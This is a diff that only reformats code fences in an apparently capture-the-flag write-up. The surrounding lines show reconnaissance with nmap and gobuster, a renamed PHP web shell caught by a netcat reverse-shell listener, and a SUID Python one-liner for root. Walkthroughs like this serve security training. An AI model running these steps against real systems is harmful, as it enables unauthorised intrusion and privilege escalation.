@@ -24,7 +24,7 @@ Do not attempt these techniques on systems you do not own or have explicit autho
 
 ### Nmap
 
-```bash
+```
 nmap -sV <ip>
  ```
 <img width="750" height="219" alt="image" src="https://github.com/user-attachments/assets/68602032-5ecd-45fe-b111-407cfa8bc46d" />
@@ -39,7 +39,7 @@ As we can see from the Nmap scan, we have ports open for SSH and HTTP. The first
 
 
 ### GoBuster
-```bash
+```
 gobuster dir -u http://<ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  ```
 <img width="750" height="310" alt="image" src="https://github.com/user-attachments/assets/ea4f95cb-d439-4fb0-8607-490a86027d5f" />
@@ -74,7 +74,7 @@ mv shell.php shell.php5
 
 Before executing the script, we need to set up a Netcat listener on our attacking machine:
 
-```bash
+```
 nc -lvnp 4444
 ```
 > ✅Executing the shell gave us a session as 'www-data'.
@@ -83,7 +83,7 @@ nc -lvnp 4444
 
 
 After stabilizing the shell, I used the find command to search for the user flag.
- ```bash
+ ```
 find / -name user.txt 2>/dev/null
 ```
 
@@ -92,7 +92,7 @@ find / -name user.txt 2>/dev/null
 
 ## Privilege Escalation
 After some enumeration I decided to look for files that have SUID permission with the command:
-```bash
+```
 find / -perm -4000 2>/dev/null
 ```
  <img width="750" height="544" alt="image" src="https://github.com/user-attachments/assets/4683a5d5-e4cf-43bd-aa1c-554d702df510" />
@@ -104,7 +104,7 @@ One binary that stood out as unusual was `/usr/bin/python`.
 
 Checking [GTFOBins](https://gtfobins.github.io/gtfobins/python/) confirmed it can be abused for privilege escalation.
 
-```bash
+```
 /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
 
